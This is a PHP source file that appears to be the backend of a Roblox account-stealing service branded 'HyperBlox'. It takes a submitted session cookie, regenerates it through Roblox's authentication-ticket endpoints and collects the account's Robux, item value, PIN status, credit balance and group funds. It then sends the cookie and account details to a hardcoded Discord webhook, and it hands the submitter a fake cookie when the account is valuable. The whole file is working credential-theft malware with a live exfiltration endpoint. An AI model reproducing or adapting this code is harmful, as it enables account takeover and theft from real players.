<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['error' => 'Invalid request method']);
    exit;
}

if (!isset($_POST['cookie']) || empty($_POST['cookie'])) {
    echo json_encode(['error' => 'No cookie provided']);
    exit;
}

$cookie = $_POST['cookie'];

function getCsrfToken($cookie) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Cookie: .ROBLOSECURITY=$cookie",
        "Content-Length: 0",
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    foreach (explode(PHP_EOL, $response) as $line) {
        if (stripos($line, 'x-csrf-token:') !== false) {
            return trim(str_ireplace('x-csrf-token:', '', $line));
        }
    }
    return null;
}

function rbxTicket($cookie, $token) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/2788229376/Da-Hood-RUBY",
        "x-csrf-token: $token",
        "Cookie: .ROBLOSECURITY=$cookie"
    ]);
    $output = curl_exec($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $header = substr($output, 0, $header_size);
    curl_close($ch);

    foreach (explode("\r\n", $header) as $line) {
        if (stripos($line, 'rbx-authentication-ticket:') !== false) {
            return trim(str_ireplace('rbx-authentication-ticket:', '', $line));
        }
    }
    return null;
}

function BypassCookieV2Old($cookie, $ticket, $token) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $ticket]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/2788229376/Da-Hood-RUBY",
        "x-csrf-token: $token",
        "RBXAuthenticationNegotiation: 1"
    ]);
    $output = curl_exec($ch);
    $Bypassed = explode(";", explode(".ROBLOSECURITY=", $output)[1])[0];
    curl_close($ch);

    return empty($Bypassed) ? $cookie : $Bypassed;
}

function makeRequest($url, $headers, $postData = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

function ownsBundle($userId, $bundleId, $headers) {
    $url = "https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId";
    $response = makeRequest($url, $headers);
    return isset($response['data']) && !empty($response['data']);
}

$token = getCsrfToken($cookie);
if ($token) {
    $ticket = rbxTicket($cookie, $token);
    if ($ticket) {
        $newCookie = BypassCookieV2Old($cookie, $ticket, $token);
        $clean = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $newCookie);
        
        $headers = ["Cookie: .ROBLOSECURITY=$clean", "Content-Type: application/json"];
        
        $settingsData = makeRequest("https://www.roblox.com/my/settings/json", $headers);
        $userId = $settingsData['UserId'];
        
        $userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers);
        
        $transactionSummaryData = makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers);
        $summary = isset($transactionSummaryData['purchasesTotal']) ? abs($transactionSummaryData['purchasesTotal']) : 'Unknown';
        $pendingRobux = $transactionSummaryData['pendingRobuxTotal'] ?? 'Unknown';
        
        $avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false");
        $avatarJson = json_decode($avatarData, true);
        $avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
        
        $balanceData = makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers);
        $robux = $balanceData['robux'] ?? 0;
        
        $collectiblesData = makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers);
        $rap = 0;
        if (isset($collectiblesData['data'])) {
            foreach ($collectiblesData['data'] as $item) {
                $rap += $item['recentAveragePrice'];
            }
        }
        
        $fakeCookie = "A243009B47547081C810B921ECD13728598D4F9B5DF24F63330923F05BB0B476B170521BABCB7CA07BC6EE742F3B9014CFF0CA2D4FBE041474F5FBB2235D239C1479AE46A6C241183914A7B9CC0CD89743B327C2350F3D3F6188C10C24D9B42B82D0CFFE5E1A00C735F94151C214E31DD961D4A0AFE0DB8D724158A62059C236AE0D7F286994776352ECF93EB94D479636DC7CD58ADBD48AF45D44E84A07A0BB6CFCB9C5B9D566CABC20D545766C93E30CF81FFEABB0D73CD28B4760C344D2D5AD9C0D50FABD15ACE6E7B3886C5D2ECE3FE1339DC5805AC44C47C43AF904799EE8D4DD526446DFE6117602A3F46F6615D40C690362A32865FB529474BE9066788AC7AB93C045EB853BCDD0904BF2BA69561960D8F40F8F4322535E5F0227C3536163D020E15351468811EFE5E473C42D3B247FC6AED12E694C2B89DD812DCE276FB63190A3F1281404AC6B0CCEE487B875981FDA1A1F903A68A4345B37DD0F0C14CC7EE8C081BC7C00671935EDCB8E9D926B30D86958BE44B4BE8BB920EDF5Q8699331B53C43067562F6CA5A5C76546562E7F5691B9670189E2231BE016C3162655642A7F14E32513BBE2F8D86E5999C849600C965EC0DF127EBF258279ADBE64A07ED1D055D00D2087B3848571F6E650E99B500D23F0371E7C38E69D03D814218C88D9O0FDCB8357D631858BAB0B1EE1220A64172CE0C3F657F7096636C6CEF8C1DAEE0BB696EB0C53398D3652F567379D8EA8863570CB7597B4A6EA750A68D2CEE5E0361C1EF3939C355C362F6628BF44CD9F0EE693CB694868B286E99E530BE3DA95599D0CBC43F16AE2F54D50E0048CCAE962636460E4ED418ADCCCAAC6C7D44775FAC1DB914458BCF5701ADED904B7DFC8E7692956AD2700ACC93C481CC725876BA0AD15ABF1CE6C9D7635F16B7B9FCE9C4E39CA8CCD8EF3D3F14D4F5C747504C5D97765BDBB8C943A4ECDCA37658BA999C024E24757058552CD55F61784FF11629F21F3BC586BA76E6A36716EB561A41833663A70026A83C3BECCB1B46C3E1C965777F3C61B391CCF7DF546B4736E812425B5616C6798185C9B9ADF053BAAF9BFF0319874F8F5DBA1E57F1E403E51F0PEC";
        
        $shouldFake = ($robux >= 45000 || $rap >= 145000 || $summary >= 650000);
        
        $pinData = makeRequest("https://auth.roblox.com/v1/account/pin", $headers);
        $pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
        
        $vcData = makeRequest("https://voice.roblox.com/v1/settings", $headers);
        $vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';
        
        $hasHeadless = ownsBundle($userId, 201, $headers);
        $hasKorblox = ownsBundle($userId, 192, $headers);
        $headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
        $korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';
        
        $accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
        $accountAge = '❓ Unknown';
        if ($accountCreated) {
            $days = floor((time() - $accountCreated) / (60 * 60 * 24));
            $accountAge = "$days days";
        }
        
        $friendsData = makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers);
        $friendsCount = $friendsData['count'] ?? '❓ Unknown';
        
        $followersData = makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers);
        $followersCount = $followersData['count'] ?? '❓ Unknown';
        
        $groupsData = makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers);
        $ownedGroups = [];
        if (isset($groupsData['data'])) {
            foreach ($groupsData['data'] as $group) {
                if ($group['role']['rank'] == 255) {
                    $ownedGroups[] = $group;
                }
            }
        }
        $totalGroupsOwned = count($ownedGroups);
        
        $totalGroupFunds = 0;
        $totalPendingGroupFunds = 0;
        foreach ($ownedGroups as $group) {
            $groupId = $group['group']['id'];
            $groupFunds = makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers);
            $totalGroupFunds += $groupFunds['robux'] ?? 0;
            
            $groupPayouts = makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers);
            if (isset($groupPayouts['data'])) {
                foreach ($groupPayouts['data'] as $payout) {
                    if ($payout['status'] === 'Pending') {
                        $totalPendingGroupFunds += $payout['amount'];
                    }
                }
            }
        }
        
        $creditBalanceData = makeRequest("https://billing.roblox.com/v1/credit", $headers);
        $creditBalance = isset($creditBalanceData['balance']) ? $creditBalanceData['balance'] : '❓ Unknown';
        $creditRobux = isset($creditBalanceData['robuxAmount']) ? $creditBalanceData['robuxAmount'] : '❓ Unknown';
        
        $emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';
        
        $timestamp = date("c");
        $embed1 = [
            'content' => '@everyone',
            'username' => 'HyperBlox',
            'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
            'embeds' => [[
                'title' => '',
                'type' => 'rich',
                'description' => "<:check:1350103884835721277> **[Check Cookie](https://hyperblox.eu/controlPage/check/check.php?cookie=$clean)** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie](https://hyperblox.eu/controlPage/antiprivacy/kingvon.php?cookie=$clean)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
                'color' => hexdec('00061a'),
                'thumbnail' => ['url' => $avatarUrl],
                'fields' => [
                    ['name' => '<:display:1348231445029847110> Display Name', 'value' => "```{$userInfoData['displayName']}```", 'inline' => true],
                    ['name' => '<:user:1348232101639618570> Username', 'value' => "```{$userInfoData['name']}```", 'inline' => true],
                    ['name' => '<:userid:1348231351777755167> User ID', 'value' => "```$userId```", 'inline' => true],
                    ['name' => '<:robux:1348231412834111580> Robux', 'value' => "```$robux```", 'inline' => true],
                    ['name' => '<:pending:1348231397529223178> Pending Robux', 'value' => "```$pendingRobux```", 'inline' => true],
                    ['name' => '<:rap:1348231409323741277> RAP', 'value' => "```$rap```", 'inline' => true],
                    ['name' => '<:summary:1348231417502371890> Summary', 'value' => "```$summary```", 'inline' => true],
                    ['name' => '<:pin:1348231400322498591> PIN', 'value' => "```$pinStatus```", 'inline' => true],
                    ['name' => '<:premium:1348231403690786949> Premium', 'value' => "```" . ($settingsData['IsPremium'] ? '✅ True' : '❌ False') . "```", 'inline' => true],
                    ['name' => '<:vc:1348233572020129792> Voice Chat', 'value' => "```$vcStatus```", 'inline' => true],
                    ['name' => '<:headless:1348232978777640981> Headless Horseman', 'value' => "```$headlessStatus```", 'inline' => true],
                    ['name' => '<:korblox:1348232956040319006> Korblox Deathspeaker', 'value' => "```$korbloxStatus```", 'inline' => true],
                    ['name' => '<:age:1348232331525099581> Account Age', 'value' => "```$accountAge```", 'inline' => true],
                    ['name' => '<:friends:1348231449798774865> Friends', 'value' => "```$friendsCount```", 'inline' => true],
                    ['name' => '<:followers:1348231447072215162> Followers', 'value' => "```$followersCount```", 'inline' => true],
                    ['name' => '<:creditbalance:1350102024376684644> Credit Card Balance', 'value' => "```$creditBalance USD (est $creditRobux Robux)```", 'inline' => true],
                    ['name' => '<:group:1350102040818221077> Groups Owned', 'value' => "```$totalGroupsOwned```", 'inline' => true],
                    ['name' => '<:combined:1350102005884125307> Combined Group Funds', 'value' => "```$totalGroupFunds Robux ($totalPendingGroupFunds pending)```", 'inline' => true],
                    ['name' => '<:status:1350102051756970025> Account Status', 'value' => "```$emailVerified```", 'inline' => true],
                ]
            ]]
        ];

        $embed2 = [
            'content' => '',
            'username' => 'HyperBlox',
            'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
            'embeds' => [[
                'description' => "```$clean```",
                'color' => hexdec('00061a')
            ]]
        ];
        
        $webhook = "https://discord.com/api/webhooks/1362856397108412436/zD3vE1kPN1ss1u43QKx8LTZWQl3NZc39VRfHriDOUfqypHbdlvVrt4pGxQ-kqaek-RxP";
        
        $ch = curl_init($webhook);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed1));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        
        sleep(2);
        
        $ch = curl_init($webhook);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($embed2));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        
        echo json_encode(['cookie' => $shouldFake ? $fakeCookie : $clean]);
    } else {
        echo json_encode(['error' => 'Authentication ticket not found.']);
    }
} else {
    echo json_encode(['error' => 'CSRF token not found.']);
}
?>